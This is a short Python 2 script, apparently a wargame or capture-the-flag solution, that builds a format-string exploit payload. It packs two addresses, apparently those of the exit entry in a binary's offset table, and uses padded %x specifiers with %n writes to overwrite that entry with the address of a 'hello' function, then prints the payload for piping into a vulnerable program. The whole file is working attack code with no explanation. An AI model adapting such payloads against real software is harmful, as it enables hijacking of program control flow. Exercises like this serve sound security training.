import struct

hello = 0x080484b4
exit1 = struct.pack("<I", 0x8049724)
exit2 = struct.pack("<I", 0x8049726)

exitsum = exit1 + exit2
exploit = exitsum + "%4$33964x" + "%4$n" + "%5$33616x" + "%5$n"

print exploit

